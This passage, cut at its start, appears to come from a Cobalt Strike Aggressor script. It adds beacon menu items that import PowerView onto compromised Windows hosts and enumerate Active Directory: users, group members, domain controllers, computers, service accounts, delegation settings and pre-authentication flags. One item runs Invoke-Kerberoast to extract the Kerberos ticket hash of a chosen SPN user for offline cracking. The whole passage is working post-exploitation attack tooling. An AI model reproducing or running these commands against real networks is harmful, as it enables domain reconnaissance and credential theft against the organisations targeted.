				bpowershell($bid, "get-aduser -filter * -prop lastbadpasswordattempt,badpwdcount | select name,lastbadpasswordattempt,badpwdcount | format-table -auto");
			}
		}


		item "Query users of a group" {
			blog($1, "\c9===========Query users of a certain group==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				$dialog = dialog("View all users of the specified group", %(groupname => ""), &groupquery);
				dialog_description($dialog, "powerview view all users of the specified group");
				drow_text($dialog, "groupname", "组名: ");
				dbutton_action($dialog, "QUERY");
				dialog_show($dialog);
			}

		}

		item "Domain Control Machine Query" {
			blog($1, "\c9=========== Domain control machine query ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Get-ADDomainController -filter * | Select-Object HostName,IPv4Address,OperatingSystem | fl");
			}
		}

		item "Get Domain Level" {
			blog($1, "\c9=========== get field level==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Get-ADDomain | Select-Object DNSRoot,PDCEmulator,DomainMode");
			}
		}

		item "Find all computers in the domain and the DNS corresponding to the computer" {
			blog($1, "\c9=========== Find all computers and DNS corresponding to computers in the domain ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Get-ADComputer -Filter * -Property Name,IPv4Address | Select-Object DNSHostName,IPv4Address,SID | fl");
			}
		}

		item "Find all users in the domain" {
			blog($1, "\c9=========== Find all users in the domain ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Get-ADUser -Filter * | Select-Object Name,ObjectClass,SID | fl");
			}
		}

		item "Looking for kerberos service user" {
			blog($1, "\c9=========== Looking for kerberos service users ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Get-ADUser -filter {ServicePrincipalName -like \"*\"} -Property * | Select-Object Name,SID,ServicePrincipalNames | fl");
			}
		}

		item "No delegation computer query" {
			blog($1, "\c9=========== No delegation computer query ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Get-ADComputer -Filter {TrustedForDelegation -eq \$True} -Properties * | select-object DNSHostName,IPv4Address,KerberosEncryptionType,whenCreated | fl");
			}
		}

		item "Constrained Delegation User Query" {
			blog($1, "\c9=========== constrained delegation user query ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Get-ADUser -Filter {TrustedToAuthForDelegation -eq \$True} -Properties * | select-object DistinguishedName,servicePrincipalName,msDS-AllowedToDelegateTo");
			}
		}

		item "Domain users do not require kerberos authentication identity query" {
			blog($1, "\c9=========== domain users do not require kerberos authentication query ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				bpowershell($bid, "Get-ADUser -Filter {DoesNotRequirePreAuth -eq \$False} | Select-Object Name,SID | fl");
			}
		}

		item "Get the hash of the specified SPN user" {
			blog($1, "\c9=========== Get the hash of the specified SPN user ==========");
			$modulename = "/scripts/InfoCollect/Powerview.ps1";
			moduleimport12($1, $modulename);
			foreach $bid ($1){
				$dialog = dialog("Get the hash of the specified SPN user", %(spnusername => ""), &spnuserquery);
				dialog_description($dialog, "powerview gets the hash of the specified SPN user");
				drow_text($dialog, "spnusername", "User: ");
				dbutton_action($dialog, "QUERY");
				dialog_show($dialog);
			}
		}
		sub moduleimport12{
			foreach $bid ($1){
				blog($bid, "Import script: $modulename");
				bpowershell_import($bid, script_resource($modulename));
			}
		}

		sub getuser{
			bpowershell($bid, "Get-ADUser -Identity \"$3['username']\"");
		}

		sub groupquery{
			bpowershell($bid, "Get-ADGroupMember \'$3['groupname']\' | Select-Object name,objectClass,distinguishedName,SID | fl");
		}

		sub spnuserquery{
			bpowershell($bid, "Invoke-Kerberoast -Identity \'$3['spnusername']\' | %{\$_.hash}");
		}		
	}
}
